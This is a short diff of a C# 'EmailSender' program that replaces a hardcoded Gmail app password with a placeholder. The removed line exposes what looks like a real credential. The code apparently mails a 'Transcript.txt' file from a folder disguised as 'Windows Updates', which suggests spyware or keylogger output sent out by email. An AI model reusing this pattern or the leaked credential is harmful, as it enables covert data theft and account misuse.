@@ -25,7 +25,7 @@ namespace EmailSender
         }
 
         static string username = "orapajelmar@gmail.com";
-        static string password = "glideqcaaqbxqxru";
+        static string password = "Enter App Password Here";
         static string attachmentPath = $"{Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)}\\Desktop\\Windows Updates\\Transcript.txt";
 
         static void SendToEmail(string email, string attachmentPath)
